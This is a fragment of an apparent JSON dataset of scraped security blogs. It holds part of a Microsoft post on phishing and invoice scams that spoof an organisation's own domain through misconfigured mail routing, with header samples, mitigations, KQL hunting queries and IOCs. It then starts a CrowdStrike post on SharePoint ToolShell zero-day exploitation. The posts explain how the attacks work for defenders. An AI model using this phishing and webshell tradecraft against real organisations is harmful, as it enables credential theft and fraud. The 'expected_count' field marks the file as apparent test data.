not pointed to Office 365, and the tenant has not configured strictly enforced spoof protections, threat actors may be able to send spoofed phishing messages that appear to have come from the tenant\u2019s own domain. Setting strict Domain-based Message Authentication, Reporting, and Conformance (DMARC) reject and SPF hard fail (rather than soft fail) policies and properly configuring any third-party connectors will prevent phishing attacks spoofing organizations\u2019 domains. This vector is not, as has been publicly reported, a vulnerability of Direct Send , a mail flow method in Microsoft 365 Exchange Online that allows devices (like printers, scanners), applications, or third-party services to send email without authentication using the organization\u2019s accepted domain, but rather takes advantage of complex routing scenarios and misconfigured spoof protections. Tenants with MX records pointed directly to Office 365 are not vulnerable to this attack vector of sending spoofed phishing messages. As with most other phishing attacks observed by Microsoft Threat intelligence throughout 2025, the bulk of phishing campaigns observed using this attack vector employ the Tycoon2FA PhaaS platform , in addition to several other phishing services in use as well. In October 2025, Microsoft Defender for Office 365 blocked more than 13 million malicious emails linked to Tycoon2FA, including many attacks spoofing organizations\u2019 domains. PhaaS platforms such as Tycoon2FA provide threat actors with a suite of capabilities, support, and ready-made lures and infrastructure to carry out phishing attacks and compromise credentials. These capabilities include adversary-in-the-middle (AiTM) phishing, which is intended to circumvent multifactor authentication (MFA) protections. Credential phishing attacks sent through this method employ a variety of themes such as voicemail notifications, password resets, HR communications, among others. Microsoft Threat Intelligence has also observed emails intended to trick organizations into paying fake invoices, potentially leading to financial losses. Generally, in these spoofed phishing attacks, the recipient email address is used in both the \u201cTo\u201d and \u201cFrom\u201d fields of the email, though some attacks will change the display name of the sender to make the attack more convincing and the \u201cFrom\u201d field could contain any valid internal email address. Credential phishing with spoofed emails The bulk of phishing messages sent through this attack vector uses the same lures as conventionally sent phishing messages, masquerading as services such as Docusign, or communications from HR regarding salary or benefits changes, password resets, and so on. They may employ clickable links in the email body or QR codes in attachments or other means of getting the recipient to navigate to a phish landing page. The appearance of having been sent from an internal email address is the most visible distinction to an end user, often with the same email address used in the \u201cTo\u201d and \u201cFrom\u201d fields. Email headers provide more information regarding the delivery of spoofed phishing emails, such as the appearance of an external IP address used by the threat actor to initiate the phishing attack. Depending on the configuration of the tenant, there will be SPF soft or hard fail, DMARC fail, and DKIM will equal none as both the sender and recipient appear to be in the same domain. At a basic level of protection, these should cause a message to land in a spam folder, but a user may retrieve and interact with phishing messages routed to spam. The X-MS-Exchange-Organization-InternalOrgSender will be set to True , but X-MS-Exchange-Organization-MessageDirectionality will be set to Incoming and X-MS-Exchange-Organization-ASDirectionalityType will have a value of \u201c1\u201d, indicating that the message was sent from outside of the organization. The combination of internal organization sender and incoming directionality is indicative of a message spoofed to appear as an internal communication, but not necessarily indicative of maliciousness. X-MS-Exchange-Organization-AuthAs will be set to Anonymous , indicating that the message came from an external source. The Authentication-Results header example provided below illustrates the result of enforced authentication. 000 is an explicit DMARC failure. The resultant action is either reject or quarantine . The headers shown here are examples of properly configured environments, effectively blocking phishing emails sent through this attack vector: spf=fail (sender IP is 51.89.59[.]188) smtp.mailfrom=contoso.com; dkim=none (message not signed) header.d=none;dmarc=fail action=quarantine header.from=contoso.com;compauth=fail reason=000 spf=fail (sender IP is 51.68.182[.]101) smtp.mailfrom= contoso.com; dkim=none (message not signed) header.d=none;dmarc=fail action=oreject header.from=contoso.com; Any third-party connectors\u2014such as a spam filtering service, security solution, or archiving service\u2014must be configured properly or spoof detections cannot be calculated correctly, allowing phishing emails such as the examples below to be delivered. The first of these examples indicate the expected authentication failures in the header, but no action is taken due to reason 905, which indicates that the tenant has set up complex routing where the mail exchanger record (MX record) points to either an on-premises Exchange environment or a third-party service before reaching Microsoft 365: spf=fail (sender IP is 176.111.219[.]85) smtp.mailfrom= contoso.com; dkim=none (message not signed) header.d=none;dmarc=fail action=none header.from= contoso.com;compauth=none reason=905 The phishing message masquerades as a notification from Microsoft Office 365 informing the recipient that their password will soon expire, although the subject line appears to be intended for a voicemail themed lure. The link in the email is a nested Google Maps URL pointing to an actor-controlled domain at online.amphen0l-fci[.]com . Figure 1. This phishing message uses a \u201cpassword expiration\u201d lure masquerading as a communication from Microsoft. The second example also shows the expected authentication failures, but with an action of \u201coreject\u201d with reason 451, indicating complex routing and that the message was delivered to the spam folder. spf=softfail (sender IP is 162.19.129[.]232) smtp.mailfrom=contoso.com; dkim=none (message not signed) header.d=none;dmarc=fail action=oreject header.from=contoso.com;compauth=none reason=451 This email masquerades as a SharePoint communication asking the recipient to review a shared document. The sender and recipient addresses are the same, though the threat actor has set the display name of the sender to \u201cPending Approval\u201d. The InternalOrgSender header is set to True . On the surface, this appears to be an internally sent email, though the use of the recipient\u2019s address in both the \u201cTo\u201d and \u201cFrom\u201d fields may alert an end user that this message is not legitimate. Figure 2. This phishing message uses a \u201cshared document\u201d lure masquerading as SharePoint. The nested Google URL in the email body points to actor-controlled domain scanuae[.]com . This domain acts as a redirector, loading a script that constructs a URL using the recipient\u2019s Base64-encoded email before loading a custom CAPTCHA page on the Tycoon2FA domain valoufroo.in[.]net . A sample of the script loaded on scanuae[.]com is shown here: Figure 3. This script crafts and redirects to a URL on a Tycoon2FA PhaaS domain. The below example of the custom CAPTCHA page is loaded at the Tycoon2FA domain goorooyi.yoshemo.in[.]net . The CAPTCHA is one of many similar CAPTCHAs observed in relation to Tycoon2FA phishing sequences. Clicking through it leads to a Tycoon2FA phish landing page where the recipient is prompted to input their credentials. Alternatively, clicking through the CAPTCHA may lead to a benign page on a legitimate domain, a tactic intended to evade detection and analysis. Figure 4. A custom CAPTCHA loaded on the Tycoon2FA PhaaS domain. Spoofed email financial scams Microsoft Threat Intelligence has also observed financial scams sent through spoofed emails. These messages are crafted to look like an email thread between a highly placed employee at the targeted organization, often the CEO of the organization, an individual requesting payment for services rendered, or the accounting department at the targeted organization. In this example, the message was initiated from 163.5.169[.]67 and authentication failures were not enforced, as DMARC is set to none and action is set to none , a permissive mode that does not protect against spoofed messages, allowing the message to reach the inbox on a tenant whose MX record is not pointed to Office 365. Authentication-Results spf=fail (sender IP is 163.5.169[.]67) smtp.mailfrom=contoso.com; dkim=none (message not signed) header.d=none;dmarc=none action=none header.from=contoso.com;compauth=fail reason=601 The scam message is crafted to appear as an email thread with a previous message between the CEO of the targeted organization, using the CEO\u2019s real name, and an individual requesting payment of an invoice. The name of the individual requesting payment (here replaced with \u201cJohn Doe\u201d) appears to be a real person, likely a victim of identity theft. The \u201cTo\u201d and \u201cFrom\u201d fields both use the address for the accounting department at the targeted organization, but with the CEO\u2019s name used as the display name in the \u201cFrom\u201d field. As with our previous examples, this email superficially appears to be internal to the organization, with only the use of the same address as sender and recipient indicating that the message may not be legitimate. The body of the message also attempts to instill a sense of urgency, asking for prompt payment to retain a discount. Figure 5. An email crafted to appear as part of an ongoing thread directing a company\u2019s accounting department to pay a fake invoice. Figure 6. Included as part of the message shown above, this is crafted to appear as an earlier communication between the CEO of the company and an individual seeking payment. Most of the emails observed as part of this campaign include three attached files. The first is the fake invoice requesting several thousand dollars to be sent through ACH payment to a bank account at an online banking company. The name of the individual requesting payment is also listed along with a fake company name and address. The bank account was likely set up using the individual\u2019s stolen personally identifiable information. Figure 7. A fake invoice including banking information attached to the scam messages. The second attachment (not pictured) is an IRS W-9 form that lists the name and social security number of the individual used to set up the bank account. The third attachment is a fake \u201cbank letter\u201d ostensibly provided by an employee at the online bank used to set up the fraudulent account. The letter provides the same banking information as the invoice and attempts to add another layer of believability to the scam. Figure 8. A fake \u201cbank letter\u201d also attached to the scam messages. Falling victim to this scam could result in significant financial losses that may not be recoverable as the funds will likely be moved quickly by the actor in control of the fraudulent bank account. Mitigation and protection guidance Preventing spoofed email attacks The following links provide information for customers whose MX records are not pointed to Office 365 on how to configure mail flow connectors and rules to prevent spoofed emails from reaching inboxes. These links provide information on how to properly configure mail flow with connectors: Manage mail flow using a third-party cloud service with Exchange Online Configure mail flow using connectors in Exchange Online Mail flow rules (transport rules) in Exchange Online Enhanced filtering for connectors in Exchange Online These links provide information on configuring SPF, DKIM, and DMARC: Email authentication in cloud organizations Set up SPF to identify valid email sources for your custom cloud domains Set up DKIM to sign mail from your cloud domain Set up DMARC to validate the From address domain for cloud senders The following links provide more in-depth information on Direct Send: Introducing more control over Direct Send in Exchange Online Direct Send vs sending directly to an Exchange Online tenant Mitigating AiTM phishing attacks Microsoft Threat Intelligence recommends the following mitigations, which are effective against a range of phishing threats. Review our recommended settings for Exchange Online Protection and Microsoft Defender for Office 365. Configure Microsoft Defender for Office 365 to recheck links on click. Safe Links provides URL scanning and rewriting of inbound email messages in mail flow, and time-of-click verification of URLs and links in email messages, other Microsoft 365 applications such as Teams, and other locations such as SharePoint Online. Safe Links scanning occurs in addition to the regular anti-spam and anti-malware protection in inbound email messages in Microsoft Exchange Online Protection (EOP). Safe Links scanning can help protect your organization from malicious links used in phishing and other attacks. Turn on Zero-hour auto purge (ZAP ) in Defender for Office 365 to quarantine sent mail in response to newly-acquired threat intelligence and retroactively neutralize malicious phishing, spam, or malware messages that have already been delivered to mailboxes. Encourage users to use Microsoft Edge and other web browsers that support Microsoft Defender SmartScreen , which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that host malware. Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attack tools and techniques. Cloud-based machine learning protections block a majority of new and unknown variants Configure Microsoft Entra with increased security . Pilot and deploy phishing-resistant authentication methods for users. Implement Entra ID Conditional Access authentication strength to require phishing-resistant authentication for employees and external users for critical apps. Mitigating threats from phishing actors begins with securing user identity by eliminating traditional credentials and adopting passwordless, phishing-resistant MFA methods such as FIDO2 security keys, Windows Hello for Business, and Microsoft Authenticator passkeys. Microsoft recommends enforcing phishing-resistant MFA for privileged roles in Microsoft Entra ID to significantly reduce the risk of account compromise. Learn how to require phishing-resistant MFA for admin roles and plan a passwordless deployment . Passwordless authentication improves security as well as enhances user experience and reduces IT overhead. Explore Microsoft\u2019s overview of passwordless authentication and authentication strength guidance to understand how to align your organization\u2019s policies with best practices. For broader strategies on defending against identity-based attacks, refer to Microsoft\u2019s blog on evolving identity attack techniques . If Microsoft Defender alerts indicate suspicious activity or confirmed compromised account or a system, it\u2019s essential to act quickly and thoroughly. Below are recommended remediation steps for each affected identity: Reset credentials \u2013 Immediately reset the account\u2019s password and revoke any active sessions or tokens. This ensures that any stolen credentials can no longer be used. Re-register or remove MFA devices \u2013 Review users MFA devices, specifically those recently added or updated. Revert unauthorized payroll or financial changes \u2013 If the attacker modified payroll or financial configurations, such as direct deposit details, revert them to their original state and notify the appropriate internal teams. Remove malicious inbox rules \u2013 Attackers often create inbox rules to hide their activity or forward sensitive data. Review and delete any suspicious or unauthorized rules. Verify MFA reconfiguration \u2013 Confirm that the user has successfully reconfigured MFA and that the new setup uses secure, phishing-resistant methods. Microsoft Defender XDR detections Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog. Customers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence. Tactic Observed activity Microsoft Defender coverage Initial access Threat actor gains access to account through phishing Microsoft Defender for Office 365 \u2013 A potentially malicious URL click was detected \u2013 Email messages containing malicious file removed after delivery \u2013 Email messages containing malicious URL removed after delivery \u2013 Email messages from a campaign removed after delivery. Microsoft Defender XDR \u2013 Compromised user account in a recognized attack pattern \u2013 Anonymous IP address \u2013 Suspicious activity likely indicative of a connection to an adversary-in-the-middle (AiTM) phishing site Defense evasion Threat actor creates an inbox rule post compromise Microsoft Defender for Cloud apps \u2013 Possible BEC-related inbox rule \u2013 Suspicious inbox manipulation rule Microsoft Security Copilot Security Copilot customers can use the standalone experience to create their own prompts or run the following prebuilt promptbooks to automate incident response or investigation tasks related to this threat: Incident investigation Microsoft User analysis Threat actor profile Threat Intelligence 360 report based on MDTI article Vulnerability impact assessment Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel. Threat intelligence reports Microsoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments. Microsoft Defender XDR threat analytics Actor profile: Storm-1747 Technique profile: Adversary-in-the-middle credential phishing Microsoft Security Copilot customers can also use the Microsoft Security Copilot integration in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the embedded experience in the Microsoft Defender portal to get more information about this threat actor. Hunting queries Microsoft Defender XDR Microsoft Defender XDR customers can run the following query to find related activity in their networks: Finding potentially spoofed emails: EmailEvents | where Timestamp >= ago(30d) | where EmailDirection == \"Inbound\" | where Connectors == \"\" // No connector used | where SenderFromDomain in (\"contoso.com\") // Replace with your domain(s) | project Timestamp, NetworkMessageId, InternetMessageId, SenderMailFromAddress, SenderFromAddress, SenderDisplayName, SenderFromDomain, SenderIPv4, RecipientEmailAddress, Subject, DeliveryAction, DeliveryLocation Finding more suspicious, potentially spoofed emails: EmailEvents | where EmailDirection == \"Inbound\" | where Connectors == \"\" // No connector used | where SenderFromDomain in (\"contoso.com\", \"fabrikam.com\") // Replace with your accepted domains | where AuthenticationDetails !contains \"SPF=pass\" // SPF failed or missing | where AuthenticationDetails !contains \"DKIM=pass\" // DKIM failed or missing | where AuthenticationDetails !contains \"DMARC=pass\" // DMARC failed or missing | where SenderIPv4 !in (\" \") // Exclude known relay IPs | where ThreatTypes has_any (\"Phish\", \"Spam\") or ConfidenceLevel == \"High\" // | project Timestamp, NetworkMessageId, InternetMessageId, SenderMailFromAddress, SenderFromAddress, SenderDisplayName, SenderFromDomain, SenderIPv4, RecipientEmailAddress, Subject, AuthenticationDetails, DeliveryAction Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with \u2018TI map\u2019) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace. The below hunting queries can also be found in the Microsoft Defender portal for customers who have Microsoft Defender XDR installed from the Content Hub, or accessed directly from GitHub. Spoof and impersonation phish detections Spoof attempts with auth failure Below are the queries using Sentinel Advanced Security Information Model (ASIM) functions to hunt threats across both Microsoft first-party and third-party data sources. ASIM also supports deploying parsers to specific workspaces from GitHub , using an ARM template or manually. Detect network IP and domain indicators of compromise using ASIM The following query checks domain and URL IOCs across data sources supported by ASIM web session parser: //IP list and domain list- _Im_NetworkSession let lookback = 30d; let ioc_ip_addr = dynamic([\"162.19.196.13\", \"163.5.221.110\", \"51.195.94.194\", \"51.89.59.188\"]); let ioc_domains = dynamic([\"2fa.valoufroo.in.net\", \"valoufroo.in.net\", \"integralsm.cl\", \"absoluteprintgroup.com\"]); _Im_NetworkSession(starttime=todatetime(ago(lookback)), endtime=now()) | where DstIpAddr in (ioc_ip_addr) or DstDomain has_any (ioc_domains) | summarize imNWS_mintime=min(TimeGenerated), imNWS_maxtime=max(TimeGenerated), EventCount=count() by SrcIpAddr, DstIpAddr, DstDomain, Dvc, EventProduct, EventVendor Detect web sessions IP and file hash indicators of compromise using ASIM The following query checks domain and URL IOCs across data sources supported by ASIM web session parser: //IP list - _Im_WebSession let lookback = 30d; let ioc_ip_addr = dynamic([\"162.19.196.13\", \"163.5.221.110\", \"51.195.94.194\", \"51.89.59.188\"]); _Im_WebSession(starttime=todatetime(ago(lookback)), endtime=now()) | where DstIpAddr in (ioc_ip_addr) | summarize imWS_mintime=min(TimeGenerated), imWS_maxtime=max(TimeGenerated), EventCount=count() by SrcIpAddr, DstIpAddr, Url, Dvc, EventProduct, EventVendor Detect domain and URL indicators of compromise using ASIM The following query checks domain and URL IOCs across data sources supported by ASIM web session parser: // file hash list - imFileEvent // Domain list - _Im_WebSession let ioc_domains = dynamic([\"2fa.valoufroo.in.net\", \"valoufroo.in.net\", \"integralsm.cl\", \"absoluteprintgroup.com\"]); _Im_WebSession (url_has_any = ioc_domains) Spoofing attempts from specific domains // Add the list of domains to search for. let DomainList = dynamic([\"2fa.valoufroo.in.net\", \"valoufroo.in.net\", \"integralsm.cl\", \"absoluteprintgroup.com\"]); EmailEvents | where TimeGenerated > ago (1d) and DetectionMethods has \"spoof\" and SenderFromDomain in~ (DomainList) | project TimeGenerated, AR=parse_json(AuthenticationDetails) , NetworkMessageId, EmailDirection, Subject, SenderFromAddress, SenderIPv4, ThreatTypes, DetectionMethods, ThreatNames | evaluate bag_unpack(AR) | where column_ifexists('SPF','') =~ \"fail\" or column_ifexists('DMARC','') =~ \"fail\" or column_ifexists('DKIM','') =~ \"fail\" or column_ifexists('CompAuth','') =~ \"fail\" | extend Name = tostring(split(SenderFromAddress, '@', 0)[0]), UPNSuffix = tostring(split(SenderFromAddress, '@', 1)[0]) | extend Account_0_Name = Name | extend Account_0_UPNSuffix = UPNSuffix | extend IP_0_Address = SenderIPv4 Indicators of compromise Indicator Type Description First seen Last seen 162.19.196[.]13 IPv4 An IP address used by an actor to initiate spoofed phishing emails. 2025-10-08 2025-11-21 163.5.221[.]110 IPv4 An IP address used by an actor to initiate spoofed phishing emails. 2025-09-10 2025-11-20 51.195.94[.]194 IPv4 An IP address used by an actor to initiate spoofed phishing emails. 2025-06-15 2025-12-07 51.89.59[.]188 IPv4 An IP address used by an actor to initiate spoofed phishing emails. 2025-09-24 2025-11-20 2fa.valoufroo.in[.]net Domain A Tycoon2FA PhaaS domain valoufroo.in[.]net Domain A Tycoon2FA PhaaS domain integralsm[.]cl Domain A redirection domain leading to phishing infrastructure. absoluteprintgroup[.]com Domain A redirection domain leading to phishing infrastructure. References https://www.mimecast.com/threat-intelligence-hub/microsoft-direct-send-abuse/ https://www.proofpoint.com/us/blog/email-and-cloud-threats/attackers-abuse-m365-for-internal-phishing https://www.varonis.com/blog/direct-send-exploit Learn more For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog . To get notified about new publications and to join discussions on social media, follow us on LinkedIn , X (formerly Twitter) , and Bluesky . To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the Microsoft Threat Intelligence podcast . X LinkedIn Microsoft Threat Intelligence See Microsoft Threat Intelligence posts Related posts February 10 15 min read Manipulating AI memory for profit: The rise of AI Recommendation Poisoning That helpful \u201cSummarize with AI\u201d button? It might be secretly manipulating what your AI recommends. February 9 3 min read A one-prompt attack that breaks LLM safety alignment As LLMs and diffusion models power more applications, their safety alignment becomes critical. February 6 5 min read Analysis of active exploitation of SolarWinds Web Help Desk We are seeing exploitation of SolarWinds Web Help Desk via CVE\u20112025\u201140551 and CVE\u20112025\u201140536 that can lead to domain compromise; here is how to patch, hunt, and mitigate now. Get started with Microsoft Security Protect your people, data, and infrastructure with AI-powered, end-to-end security from Microsoft. Learn how Connect with us on social X YouTube LinkedIn What's new Surface Pro Surface Laptop Surface Laptop Studio 2 Copilot for organizations Copilot for personal use AI in Windows Explore Microsoft products Windows 11 apps Microsoft Store Account profile Download Center Microsoft Store support Returns Order tracking Certified Refurbished Microsoft Store Promise Flexible Payments Education Microsoft in education Devices for education Microsoft Teams for Education Microsoft 365 Education How to buy for your school Educator training and development Deals for students and parents AI for education Business Microsoft AI Microsoft Security Dynamics 365 Microsoft 365 Microsoft Power Platform Microsoft Teams Microsoft 365 Copilot Small Business Developer & IT Azure Microsoft Developer Microsoft Learn Support for AI marketplace apps Microsoft Tech Community Microsoft Marketplace Marketplace Rewards Visual Studio Company Careers About Microsoft Company news Privacy at Microsoft Investors Diversity and inclusion Accessibility Sustainability English (United States) Your Privacy Choices Opt-Out Icon Your Privacy Choices Consumer Health Privacy Sitemap Contact Microsoft Privacy Manage cookies Terms of use Trademarks Safety & eco Recycling About our ads \u00a9 Microsoft 2026",
    "expected_count": 3
  },
  {
    "url": "https://www.crowdstrike.com/en-us/blog/crowdstrike-detects-blocks-sharepoint-zero-day-exploitation/",
    "title": "CrowdStrike Detects and Blocks SharePoint Zero-Day Exploitation",
    "content": "CrowdStrike Detects and Blocks SharePoint Zero-Day Exploitation BLOG Featured CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner\u00ae Peer Insights\u2122 Voice of the Customer for User Authentication Feb 12, 2026 How to Scale SOC Automation with Falcon Fusion SOAR Feb 11, 2026 Inside the Human-AI Feedback Loop Powering CrowdStrike\u2019s Agentic Security Feb 10, 2026 February 2026 Patch Tuesday: Six Zero-Days Among 59 CVEs Patched Feb 10, 2026 Recent CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner\u00ae Peer Insights\u2122 Voice of the Customer for User Authentication Feb 12, 2026 How to Scale SOC Automation with Falcon Fusion SOAR Feb 11, 2026 Inside the Human-AI Feedback Loop Powering CrowdStrike\u2019s Agentic Security Feb 10, 2026 February 2026 Patch Tuesday: Six Zero-Days Among 59 CVEs Patched Feb 10, 2026 Video Video Highlights the 4 Key Steps to Successful Incident Response Dec 02, 2019 Helping Non-Security Stakeholders Understand ATT&CK in 10 Minutes or Less [VIDEO] Feb 21, 2019 Analyzing Targeted Intrusions Through the ATT&CK Framework Lens [VIDEO] Jan 22, 2019 Qatar\u2019s Commercial Bank Chooses CrowdStrike Falcon\u00ae: A Partnership Based on Trust [VIDEO] Aug 20, 2018 Category Agentic SOC Agentic SOC Inside the Human-AI Feedback Loop Powering CrowdStrike\u2019s Agentic Security 02/10/26 CrowdStrike to Acquire SGNL to Secure Every Identity in the AI Era 01/08/26 CrowdStrike\u2019s Journey in Customizing NVIDIA Nemotron Models for Peak Accuracy and Performance 01/05/26 How CrowdStrike Trains GenAI Models at Scale Using Distributed Computing 12/22/25 Cloud & Application Security Cloud & Application Security CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner Peer Insights\u2122 Voice of the Customer for Application Security Posture Management Tools 02/03/26 CrowdStrike Unveils Real-Time Cloud Detection and Response Innovations 12/01/25 New User Experience Transforms Interaction with the Falcon Platform 10/21/25 How Falcon ASPM Secures GenAI Applications and Lessons from Dogfooding 09/30/25 Threat Hunting & Intel Threat Hunting & Intel LABYRINTH CHOLLIMA Evolves into Three Adversaries 01/29/26 How CrowdStrike\u2019s Malware Analysis Agent Detects Malware at Machine Speed 01/06/26 Unveiling WARP PANDA: A New Sophisticated China-Nexus Adversary 12/04/25 CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers 11/20/25 Endpoint Security & XDR Endpoint Security & XDR Advanced Web Shell Detection and Prevention: A Deep Dive into CrowdStrike's Linux Sensor Capabilities 02/05/26 CrowdStrike Falcon Scores Perfect 100% in SE Labs\u2019 Most Challenging Ransomware Test 02/03/26 CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner\u00ae Voice of the Customer for Endpoint Protection Platforms 01/28/26 Small Devices, Big Risk: USB Drives Threaten Enterprise Security 01/21/26 Engineering & Tech Engineering & Tech EMBER2024: Advancing the Training of Cybersecurity ML Models Against Evasive Malware 09/03/25 Falcon Platform Prevents COOKIE SPIDER\u2019s SHAMOS Delivery on macOS 08/20/25 CrowdStrike\u2019s Approach to Better Machine Learning Evaluation Using Strategic Data Splitting 08/11/25 CrowdStrike Researchers Develop Custom XGBoost Objective to Improve ML Model Release Stability 03/20/25 Executive Viewpoint Executive Viewpoint The Architecture of Agentic Defense: Inside the Falcon Platform 01/16/26 The Dawn of the Agentic SOC: Reimagining Cybersecurity for the AI Era 09/26/25 CrowdStrike Falcon Platform Evolves to Lead the Agentic Security Era 09/16/25 CrowdStrike to Acquire Pangea to Secure Enterprise AI Use and Development 09/15/25 From The Front Lines From The Front Lines CrowdStrike Named a Leader in 2025 IDC MarketScape for Worldwide Incident Response Services 08/27/25 CrowdStrike Launches New AI Security Services to Strengthen AI Security and SOC Readiness 08/06/25 CrowdStrike Detects and Blocks Initial SharePoint Zero-Day Exploitation 07/21/25 Prescription for Protection: Healthcare Industry Observations from CrowdStrike Investigations 07/01/25 Next-Gen Identity Security Next-Gen Identity Security CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner\u00ae Peer Insights\u2122 Voice of the Customer for User Authentication 02/12/26 CrowdStrike to Acquire Seraphic to Secure Work in Any Browser 01/13/26 Falcon Shield Evolves with AI Agent Visibility and Falcon Next-Gen SIEM Integration 12/08/25 CrowdStrike Named Overall Leader in 2025 KuppingerCole ITDR Leadership Compass 11/10/25 Next-Gen SIEM & Log Management Next-Gen SIEM & Log Management How to Scale SOC Automation with Falcon Fusion SOAR 02/11/26 Transform AWS Security Operations with Falcon Next-Gen SIEM 12/01/25 CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR 11/05/25 CrowdStrike Named a Visionary in 2025 Gartner\u00ae Magic Quadrant\u2122 for Security Information and Event Management 10/10/25 Public Sector Public Sector CrowdStrike Achieves FedRAMP\u00ae High Authorization 03/19/25 NHS Matures Healthcare Cybersecurity with NCSC\u2019s CAF Assurance Model 03/13/25 Zero Trust Strengthens Data Protection to Achieve National Cyber Strategy Goals 01/15/25 CrowdStrike Statement on Bloomberg\u2019s October 25, 2024 Story 10/25/24 Exposure Management Exposure Management February 2026 Patch Tuesday: Six Zero-Days Among 59 CVEs Patched 02/10/26 CrowdStrike Is the Only Vendor to Be Named a Customers\u2019 Choice in 2025 Gartner\u00ae Voice of the Customer for External Attack Surface Management 02/09/26 January 2026 Patch Tuesday: 114 CVEs Patched Including 3 Zero-Days 01/13/26 Inside the Latest Innovations Powering Falcon Exposure Management 12/12/25 Data Protection Data Protection Falcon Data Protection for Cloud Extends DSPM into Runtime 11/20/25 CrowdStrike Stops GenAI Data Leaks with Unified Data Protection 09/18/25 Q&A: How Mastronardi Produce Secures Innovation with CrowdStrike 02/14/25 Data Protection Day 2025: The Evolving Role of AI in Data Protection 01/28/25 Securing AI Securing AI What Security Teams Need to Know About OpenClaw, the AI Super Agent 02/04/26 Secure AI with CrowdStrike: Real-World Stories of Protecting AI Workloads and Data 02/02/26 How Agentic Tool Chain Attacks Threaten AI Agent Security 01/30/26 Data Protection Day 2026: From Compliance to Resilience 01/28/26 Start Free Trial Featured Recent Video Category Start Free Trial CrowdStrike Detects and Blocks Initial SharePoint Zero-Day Exploitation Learn more about this emerging threat and how CrowdStrike customers can use the Falcon platform to protect their environments. July 21, 2025 | CrowdStrike Engineering | From The Front Lines Beginning on July 18, 2025, at approximately 0700 UTC, CrowdStrike Falcon\u00ae Complete Next-Gen MDR and CrowdStrike Falcon\u00ae Adversary OverWatch\u2122 identified a wave of Microsoft SharePoint exploitation attempts by an unknown adversary. Two distinct zero-day vulnerabilities were made publicly available: a critical remote code execution vulnerability ( CVE-2025-53770 ) and a server spoofing vulnerability ( CVE-2025-53771 ). The chaining of these vulnerabilities to exploit a vulnerable SharePoint server is being referred to as \u201cToolShell.\u201d Since the start of this exploitation, CrowdStrike has observed and successfully blocked hundreds of exploitation attempts across 160+ customer environments, demonstrating both the scale of this threat and the effectiveness of our protection capabilities. The CrowdStrike Falcon\u00ae platform detects and protects against exploitation of the Microsoft SharePoint zero-days, blocking known behaviors associated with these vulnerabilities. This blog post provides context surrounding this emerging threat, as well as guidance for customers on how they can use the Falcon platform to protect their environments. Customers of CrowdStrike Falcon\u00ae Adversary Intelligence Premium can find more detailed analysis in Intel report CSA-250846. Observed Exploitation of SharePoint Vulnerability CrowdStrike has observed widespread exploitation of CVE-2025-53770 involving a deserialisation attack leading to attempts to write a malicious .aspx webshell on the host. That file, spinstall0.aspx , is used to steal IIS Machine Keys, which can later be used for other post-exploitation attacks. This attack begins with a specially crafted POST request to an accessible SharePoint server. The POST request payload will attempt to write the .aspx file via PowerShell. That malicious PowerShell command, spawned from the SharePoint IIS process, is blocked by the Falcon platform. Figure 1. Blocked PowerShell spawned from the SharePoint worker process w3wp.exe (click to open in new tab) We have tracked the size and speed of attempted payload delivery over time by mapping detections from the Falcon platform. The following timeline of activity has been observed: July 18 (morning UTC): A small number of SharePoint servers were attacked July 18 (1330-1845 UTC): Shortly after, likely following the publicity of the zero-day, the campaign ramped up significantly with 177 servers attacked on the same day July 19 (0600-0800 UTC): Exploitation recommenced briefly before temporarily ceasing July 21 (0740 UTC): Activity resumes with 32 servers attacked in four hours up to 1130 UTC Figure 2. Observed instances of attempted exploitation of SharePoint servers over time (click to open in new tab) Defending Against This Threat Organizations are strongly encouraged to apply patches that have been released to ensure they are protected. Microsoft has published customer guidance and released patches for Microsoft SharePoint Server 2019 Core , Microsoft SharePoint Server Subscription Edition , and Microsoft SharePoint Enterprise Server 2016 . CrowdStrike Falcon Endpoint Detection and Response As mentioned in our opening analysis, this attack relies on specially crafted POST requests to exploit the SharePoint zero-day vulnerabilities. CrowdStrike Falcon\u00ae Insight XDR endpoint security successfully detected and blocked these attacks through advanced behavioral analysis rather than relying on signature-based detections. The attack chain exploits SharePoint servers by executing malicious code to extract authentication keys, enabling attackers to send authenticated system-level commands. Falcon Insight XDR\u2019s behavioral engine identified suspicious activity when SharePoint processes began launching command prompts and PowerShell scripts \u2014 a clear deviation from normal SharePoint operations. Our multi-layered approach detected: Abnormal process behavior : Suspicious process chains originating from SharePoint services, including webshells and reconnaissance Network anomalies : Questionable DNS requests that generated alerts in the Falcon console Behavioral correlation : Multiple indicators confirming malicious intent Threat actors continuously adapt their techniques based on security vendor responses. CrowdStrike's threat research team proactively enhances our detection capabilities in response. We are deploying additional behavioral detections this week that focus on post-exploitation activities and alternative attack vectors, providing continued coverage as attack methods evolve. CrowdStrike Falcon Exposure Management Customers can find CVE-2025-53770 and CVE-2025-53771 with CrowdStrike Falcon\u00ae Exposure Management\u2019s vulnerability management capability. CrowdStrike has developed a custom dashboard for Falcon Exposure Management customers so they can quickly see which hosts are vulnerable. The dashboard includes threat analysis provided by researchers, detailed information on vulnerable hosts, and the count of vulnerable product versions. As with other custom 